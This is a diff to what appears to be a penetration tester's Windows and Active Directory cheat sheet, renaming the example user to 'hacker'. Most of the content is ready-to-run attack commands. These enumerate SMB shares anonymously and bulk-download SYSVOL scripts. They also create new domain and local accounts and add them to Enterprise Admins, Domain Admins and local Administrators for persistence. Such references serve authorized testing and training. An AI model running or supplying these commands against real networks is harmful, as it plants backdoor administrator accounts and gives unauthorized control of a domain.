@@ -21,7 +21,7 @@ Places > Network > Browse Network
 # Create an anonymous connection
 
 smbclient -N -L <target IP>
-smbclient -W Workgroup -U ‘Lee%password’ \\\\192.168.1.105\\SYSVOL
+smbclient -W Workgroup -U ‘hacker%password’ \\\\192.168.1.105\\SYSVOL
 smb:\> recurse 
 smb:\> prompt off 
 smb:\> mget scripts
@@ -39,8 +39,8 @@ global.exe "domain admins" \\dc-controller
 
 # Impersonate a Domain Admin to create Enterprise Admin credentials:
 
-net user Lee password /add /domain
-net group "Enterprise Admins" Lee /add /domain
+net user hacker password /add /domain
+net group "Enterprise Admins" hacker /add /domain
 net groups "Enterprise Admins" /domain
 
 ------------------------------------------------------------------------------------------------------
@@ -69,14 +69,13 @@ net localgroup                              Local Security Groups.
 net localgroup /domain                      Domain Security Groups.
 net localgroup Administrators               Users in the local Administrators Security Group.
 net localgroup Administrators /domain       Users in the domain Administrators Security Group.
-net group "ePO Admins" /domain              Users in the domain ePO Admins Security Group.
-net user "lee.baird" /domain                Info on domain user.
+net user hacker /domain                     Info on domain user.
 net accounts                                Local password policies.
 net config workstation
 net share
 
-net user lee password /add
-net localgroup administrators /add lee
+net user hacker password /add
+net localgroup administrators /add hacker
 ------------------------------------------------------------------------------------------------------
 
 # Domain accounts
@@ -84,8 +83,9 @@ net localgroup administrators /add lee
 net group “Domain Admins" /domain > domain-admin.txt
 net group “Domain Users" /domain > domain-users.txt
 
-net user lee password /add /domain
-net group "Domain Admins" lee /add /domain
+net user hacker password /add /domain
+net group "Enterprise Admins" hacker /add /domain
+net groups "Enterprise Admins" /domain
 ------------------------------------------------------------------------------------------------------
 
 # Enumeration
